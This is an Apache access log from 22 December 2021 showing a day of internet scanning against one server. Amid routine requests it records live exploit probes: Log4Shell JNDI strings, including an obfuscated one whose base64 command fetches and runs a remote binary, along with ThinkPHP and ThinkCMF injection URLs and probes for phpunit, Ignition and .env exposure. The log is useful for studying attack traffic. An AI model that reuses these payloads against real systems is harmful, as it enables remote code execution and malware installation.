118.123.105.67 - - [22/Dec/2021:06:25:45 +0000] "GET / HTTP/1.0" 302 197 "-" "-"
118.123.105.67 - - [22/Dec/2021:06:25:46 +0000] "GET / HTTP/1.1" 302 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [22/Dec/2021:06:25:47 +0000] "GET /application/home HTTP/1.1" 301 547 "http://198.251.65.174" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
198.251.65.174 - - [22/Dec/2021:06:25:47 +0000] "GET /application/core/src/persistance/setup/localhost.xml HTTP/1.0" 403 459 "-" "-"
198.251.65.174 - - [22/Dec/2021:06:25:47 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
198.251.65.174 - - [22/Dec/2021:06:25:47 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
118.123.105.67 - - [22/Dec/2021:06:25:47 +0000] "GET /application/home/ HTTP/1.1" 200 3163 "http://198.251.65.174/application/home" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [22/Dec/2021:06:25:48 +0000] "GET /favicon.ico HTTP/1.1" 404 437 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [22/Dec/2021:06:25:48 +0000] "GET /robots.txt HTTP/1.1" 404 437 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.67 - - [22/Dec/2021:06:25:49 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 437 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
195.54.160.149 - - [22/Dec/2021:06:48:10 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.54.160.149 - - [22/Dec/2021:07:29:42 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 302 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.54.160.149 - - [22/Dec/2021:07:29:43 +0000] "GET /application/home HTTP/1.1" 301 566 "http://198.251.65.174:80/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
130.211.54.158 - - [22/Dec/2021:07:35:16 +0000] "GET / HTTP/1.1" 302 234 "-" "python-requests/2.26.0"
71.84.222.62 - - [22/Dec/2021:07:40:15 +0000] "GET / HTTP/1.1" 400 0 "-" "-"
198.98.49.124 - - [22/Dec/2021:08:02:50 +0000] "GET / HTTP/1.1" 302 197 "-" "Linux Gnu (cow)"
195.54.160.149 - - [22/Dec/2021:08:29:58 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 302 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.54.160.149 - - [22/Dec/2021:09:01:34 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 302 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.54.160.149 - - [22/Dec/2021:09:01:34 +0000] "GET /application/home HTTP/1.1" 301 566 "http://198.251.65.174:80/?XDEBUG_SESSION_START=phpstorm" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
198.251.65.174 - - [22/Dec/2021:09:01:34 +0000] "GET /application/core/src/persistance/setup/localhost.xml HTTP/1.0" 403 459 "-" "-"
198.251.65.174 - - [22/Dec/2021:09:01:34 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
198.251.65.174 - - [22/Dec/2021:09:01:34 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
195.54.160.149 - - [22/Dec/2021:09:01:34 +0000] "GET /application/home/ HTTP/1.1" 200 3182 "http://198.251.65.174:80/application/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
107.189.14.136 - - [22/Dec/2021:09:09:22 +0000] "GET /gameConfig.js?v=1640163559759 HTTP/1.1" 404 462 "-" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
195.54.160.149 - - [22/Dec/2021:09:17:25 +0000] "GET /console/ HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
198.27.84.160 - - [22/Dec/2021:09:29:15 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.27.84.160 - - [22/Dec/2021:09:29:15 +0000] "POST / HTTP/1.1" 302 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.251.102.74 - - [22/Dec/2021:09:31:39 +0000] "GET / HTTP/1.1" 302 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
23.251.102.74 - - [22/Dec/2021:09:31:39 +0000] "GET /application/home HTTP/1.1" 301 547 "http://198.251.65.174/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
198.251.65.174 - - [22/Dec/2021:09:31:39 +0000] "GET /application/core/src/persistance/setup/localhost.xml HTTP/1.0" 403 459 "-" "-"
198.251.65.174 - - [22/Dec/2021:09:31:40 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
198.251.65.174 - - [22/Dec/2021:09:31:40 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
23.251.102.74 - - [22/Dec/2021:09:31:39 +0000] "GET /application/home/ HTTP/1.1" 200 3163 "http://198.251.65.174/application/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
195.54.160.149 - - [22/Dec/2021:09:58:36 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
125.64.94.140 - - [22/Dec/2021:10:16:08 +0000] "GET / HTTP/1.0" 302 197 "-" "-"
125.64.94.140 - - [22/Dec/2021:10:16:08 +0000] "GET / HTTP/1.1" 302 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [22/Dec/2021:10:16:09 +0000] "GET /application/home HTTP/1.1" 301 547 "http://198.251.65.174" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
198.251.65.174 - - [22/Dec/2021:10:16:09 +0000] "GET /application/core/src/persistance/setup/localhost.xml HTTP/1.0" 403 459 "-" "-"
198.251.65.174 - - [22/Dec/2021:10:16:09 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
198.251.65.174 - - [22/Dec/2021:10:16:09 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
125.64.94.140 - - [22/Dec/2021:10:16:09 +0000] "GET /application/home/ HTTP/1.1" 200 3163 "http://198.251.65.174/application/home" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [22/Dec/2021:10:16:35 +0000] "GET /favicon.ico/ HTTP/1.1" 404 437 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [22/Dec/2021:10:16:35 +0000] "GET /robots.txt HTTP/1.1" 404 437 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [22/Dec/2021:10:16:35 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 437 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
196.250.203.1 - - [22/Dec/2021:10:18:13 +0000] "-" 408 0 "-" "-"
196.250.203.1 - - [22/Dec/2021:10:19:13 +0000] "-" 408 0 "-" "-"
196.250.203.1 - - [22/Dec/2021:10:20:14 +0000] "-" 408 0 "-" "-"
196.250.203.1 - - [22/Dec/2021:10:21:15 +0000] "-" 408 0 "-" "-"
51.254.59.113 - - [22/Dec/2021:10:22:26 +0000] "GET / HTTP/1.1" 302 197 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
51.254.59.113 - - [22/Dec/2021:10:22:27 +0000] "GET /application/home HTTP/1.1" 301 566 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
198.251.65.174 - - [22/Dec/2021:10:22:27 +0000] "GET /application/core/src/persistance/setup/localhost.xml HTTP/1.0" 403 459 "-" "-"
198.251.65.174 - - [22/Dec/2021:10:22:27 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
198.251.65.174 - - [22/Dec/2021:10:22:27 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
51.254.59.113 - - [22/Dec/2021:10:22:27 +0000] "GET /application/home/ HTTP/1.1" 200 11979 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
196.250.203.1 - - [22/Dec/2021:10:25:21 +0000] "-" 408 0 "-" "-"
196.250.203.1 - - [22/Dec/2021:10:27:13 +0000] "-" 408 0 "-" "-"
196.250.203.1 - - [22/Dec/2021:10:30:13 +0000] "-" 408 0 "-" "-"
196.250.203.1 - - [22/Dec/2021:10:32:16 +0000] "-" 408 0 "-" "-"
196.250.203.1 - - [22/Dec/2021:10:36:13 +0000] "-" 408 0 "-" "-"
195.54.160.149 - - [22/Dec/2021:10:38:02 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
196.250.203.1 - - [22/Dec/2021:10:39:13 +0000] "-" 408 0 "-" "-"
196.250.203.1 - - [22/Dec/2021:10:41:13 +0000] "-" 408 0 "-" "-"
196.250.203.1 - - [22/Dec/2021:10:42:13 +0000] "-" 408 0 "-" "-"
196.250.203.1 - - [22/Dec/2021:10:44:13 +0000] "-" 408 0 "-" "-"
45.61.185.22 - - [22/Dec/2021:10:47:05 +0000] "GET /template/desktop/js/vlxx.js?v=2 HTTP/1.1" 404 450 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.2 Safari/602.3.12"
196.250.203.1 - - [22/Dec/2021:10:52:13 +0000] "-" 408 0 "-" "-"
196.250.203.1 - - [22/Dec/2021:10:53:13 +0000] "-" 408 0 "-" "-"
196.250.203.1 - - [22/Dec/2021:10:54:13 +0000] "-" 408 0 "-" "-"
196.250.203.1 - - [22/Dec/2021:10:55:13 +0000] "-" 408 0 "-" "-"
196.250.203.1 - - [22/Dec/2021:10:57:13 +0000] "-" 408 0 "-" "-"
196.250.203.1 - - [22/Dec/2021:10:58:13 +0000] "-" 408 0 "-" "-"
195.54.160.149 - - [22/Dec/2021:11:23:49 +0000] "GET / HTTP/1.1" 302 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.54.160.149 - - [22/Dec/2021:11:23:49 +0000] "GET /application/home HTTP/1.1" 301 566 "http://198.251.65.174:80" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
198.251.65.174 - - [22/Dec/2021:11:23:53 +0000] "GET /application/core/src/persistance/setup/localhost.xml HTTP/1.0" 403 459 "-" "-"
198.251.65.174 - - [22/Dec/2021:11:23:53 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
198.251.65.174 - - [22/Dec/2021:11:23:53 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
195.54.160.149 - - [22/Dec/2021:11:23:53 +0000] "GET /application/home/ HTTP/1.1" 200 3182 "http://198.251.65.174:80/application/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
41.208.166.38 - - [22/Dec/2021:11:31:10 +0000] "-" 408 0 "-" "-"
41.82.169.14 - - [22/Dec/2021:11:52:47 +0000] "-" 408 0 "-" "-"
31.207.47.5 - - [22/Dec/2021:12:00:55 +0000] "\x03" 400 0 "-" "-"
162.142.125.193 - - [22/Dec/2021:12:06:12 +0000] "GET / HTTP/1.1" 302 178 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.43 - - [22/Dec/2021:12:06:12 +0000] "GET / HTTP/1.1" 302 178 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.57 - - [22/Dec/2021:12:06:12 +0000] "GET / HTTP/1.1" 302 178 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
41.82.169.14 - - [22/Dec/2021:12:16:33 +0000] "-" 408 0 "-" "-"
188.190.221.228 - - [22/Dec/2021:12:28:48 +0000] "GET / HTTP/1.1" 302 178 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
61.219.11.151 - - [22/Dec/2021:12:30:35 +0000] "POST /result%3Fhl%3Den%26meta%3Dvvnwppnloxhwtqccppbyhqmrwyswqen HTTP/1.1" 400 0 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
195.54.160.149 - - [22/Dec/2021:12:38:26 +0000] "GET / HTTP/1.1" 302 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.54.160.149 - - [22/Dec/2021:12:38:27 +0000] "GET /application/home HTTP/1.1" 301 566 "http://198.251.65.174:80/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
198.251.65.174 - - [22/Dec/2021:12:38:27 +0000] "GET /application/core/src/persistance/setup/localhost.xml HTTP/1.0" 403 459 "-" "-"
198.251.65.174 - - [22/Dec/2021:12:38:27 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
198.251.65.174 - - [22/Dec/2021:12:38:27 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
195.54.160.149 - - [22/Dec/2021:12:38:27 +0000] "GET /application/home/ HTTP/1.1" 200 3182 "http://198.251.65.174:80/application/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
18.233.166.97 - - [22/Dec/2021:13:09:20 +0000] "GET /explore HTTP/1.1" 404 456 "-" "-"
41.82.165.211 - - [22/Dec/2021:13:16:35 +0000] "-" 408 0 "-" "-"
192.241.212.115 - - [22/Dec/2021:13:27:58 +0000] "GET / HTTP/1.1" 302 178 "-" "Mozilla/5.0 zgrab/0.x"
41.82.163.117 - - [22/Dec/2021:13:43:30 +0000] "-" 408 0 "-" "-"
196.196.41.68 - - [22/Dec/2021:13:43:50 +0000] "GET / HTTP/1.1" 302 178 "-" "-"
41.82.163.117 - - [22/Dec/2021:13:46:19 +0000] "-" 408 0 "-" "-"
27.41.7.101 - - [22/Dec/2021:13:59:16 +0000] "POST /HNAP1/ HTTP/1.0" 408 487 "-" "-"
45.146.165.168 - - [22/Dec/2021:14:12:56 +0000] "GET / HTTP/1.1" 302 178 "-" "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}${upper:d}${lower:a}${upper:p}://45.146.165.168:1389/;;198.251.65.174--80;;${env:USERDOMAIN};;${env:COMPUTERNAME};;${java:os};;${sys:java.version};;}"
41.82.173.52 - - [22/Dec/2021:14:55:43 +0000] "-" 408 0 "-" "-"
198.98.49.124 - - [22/Dec/2021:14:58:52 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 456 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.58.179 - - [22/Dec/2021:14:59:23 +0000] "GET /js/index.js HTTP/1.1" 404 460 "-" "Mozilla/5.0 (iPad; CPU OS 9_2_1 like Mac OS X) AppleWebKit/601.1 (KHTML, like Gecko) CriOS/48.0.2564.104 Mobile/13D15 Safari/601.1.46"
125.64.94.140 - - [22/Dec/2021:15:23:26 +0000] "GET / HTTP/1.0" 302 197 "-" "-"
125.64.94.140 - - [22/Dec/2021:15:23:29 +0000] "GET / HTTP/1.1" 302 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [22/Dec/2021:15:23:30 +0000] "GET /application/home HTTP/1.1" 301 547 "http://198.251.65.174" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
198.251.65.174 - - [22/Dec/2021:15:23:30 +0000] "GET /application/core/src/persistance/setup/localhost.xml HTTP/1.0" 403 459 "-" "-"
198.251.65.174 - - [22/Dec/2021:15:23:30 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
198.251.65.174 - - [22/Dec/2021:15:23:30 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
125.64.94.140 - - [22/Dec/2021:15:23:30 +0000] "GET /application/home/ HTTP/1.1" 200 3163 "http://198.251.65.174/application/home" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [22/Dec/2021:15:23:33 +0000] "GET /favicon.ico HTTP/1.1" 404 437 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [22/Dec/2021:15:23:34 +0000] "GET /robots.txt HTTP/1.1" 404 437 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.140 - - [22/Dec/2021:15:23:34 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 437 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
183.136.225.56 - - [22/Dec/2021:15:47:59 +0000] "GET / HTTP/1.1" 302 234 "-" "Baiduspider+(+http://www.baidu.com/search/spider.htm);googlebot|baiduspider|baidu|spider|sogou|bingbot|bot|yahoo|soso|sosospider|360spider|youdaobot|jikeSpider;)"
183.136.225.56 - - [22/Dec/2021:15:48:00 +0000] "GET /application/home HTTP/1.1" 301 603 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
41.208.166.38 - - [22/Dec/2021:15:57:06 +0000] "-" 408 0 "-" "-"
41.208.166.38 - - [22/Dec/2021:15:58:28 +0000] "-" 408 0 "-" "-"
128.14.133.58 - - [22/Dec/2021:16:01:05 +0000] "GET / HTTP/1.1" 302 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
128.14.133.58 - - [22/Dec/2021:16:01:06 +0000] "GET /application/home HTTP/1.1" 301 547 "http://198.251.65.174/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
198.251.65.174 - - [22/Dec/2021:16:01:06 +0000] "GET /application/core/src/persistance/setup/localhost.xml HTTP/1.0" 403 459 "-" "-"
198.251.65.174 - - [22/Dec/2021:16:01:06 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
198.251.65.174 - - [22/Dec/2021:16:01:06 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
128.14.133.58 - - [22/Dec/2021:16:01:06 +0000] "GET /application/home/ HTTP/1.1" 200 3163 "http://198.251.65.174/application/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
154.89.5.70 - - [22/Dec/2021:16:05:21 +0000] "GET / HTTP/1.0" 302 197 "-" "-"
41.208.166.38 - - [22/Dec/2021:16:05:31 +0000] "-" 408 0 "-" "-"
41.208.166.38 - - [22/Dec/2021:16:08:12 +0000] "-" 408 0 "-" "-"
41.208.166.38 - - [22/Dec/2021:16:21:03 +0000] "-" 408 0 "-" "-"
41.208.166.38 - - [22/Dec/2021:16:21:51 +0000] "-" 408 0 "-" "-"
71.6.232.4 - - [22/Dec/2021:16:27:44 +0000] "GET / HTTP/1.1" 302 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
41.208.166.38 - - [22/Dec/2021:16:54:04 +0000] "-" 408 0 "-" "-"
41.208.166.38 - - [22/Dec/2021:17:04:06 +0000] "-" 408 0 "-" "-"
188.4.233.222 - - [22/Dec/2021:17:05:24 +0000] "GET / HTTP/1.1" 302 178 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
45.146.165.168 - - [22/Dec/2021:17:30:09 +0000] "GET / HTTP/1.1" 302 178 "-" "${jndi:ldap://45.146.165.168:1389/;;198.251.65.174--80;;${env:USERDOMAIN};;${env:COMPUTERNAME};;${java:os};;${sys:java.version};;}"
41.208.166.38 - - [22/Dec/2021:17:31:58 +0000] "-" 408 0 "-" "-"
199.127.62.108 - - [22/Dec/2021:17:36:05 +0000] "GET / HTTP/1.1" 302 197 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')"
199.127.62.108 - - [22/Dec/2021:17:36:14 +0000] "GET /application/home HTTP/1.1" 301 566 "http://198.251.65.174:80/" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')"
198.251.65.174 - - [22/Dec/2021:17:36:22 +0000] "GET /application/core/src/persistance/setup/localhost.xml HTTP/1.0" 403 459 "-" "-"
198.251.65.174 - - [22/Dec/2021:17:36:22 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
198.251.65.174 - - [22/Dec/2021:17:36:22 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
199.127.62.108 - - [22/Dec/2021:17:36:22 +0000] "GET /application/home/ HTTP/1.1" 200 11979 "http://198.251.65.174:80/application/home" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMjA5LjE0MS40Ni4xMTQvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8yMDkuMTQxLjQ2LjExNC9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')"
37.49.225.129 - - [22/Dec/2021:17:46:58 +0000] "GET / HTTP/1.1" 302 197 "-" "-"
37.49.225.129 - - [22/Dec/2021:17:47:42 +0000] "GET /application/home HTTP/1.1" 301 566 "-" "-"
115.76.51.144 - - [22/Dec/2021:17:47:51 +0000] "GET / HTTP/1.1" 302 178 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
198.251.65.174 - - [22/Dec/2021:17:47:59 +0000] "GET /application/core/src/persistance/setup/localhost.xml HTTP/1.0" 403 459 "-" "-"
198.251.65.174 - - [22/Dec/2021:17:47:59 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
198.251.65.174 - - [22/Dec/2021:17:47:59 +0000] "GET /resources/1/images//logo.png HTTP/1.0" 200 56298 "-" "-"
37.49.225.129 - - [22/Dec/2021:17:47:59 +0000] "GET /application/home/ HTTP/1.1" 200 11979 "-" "-"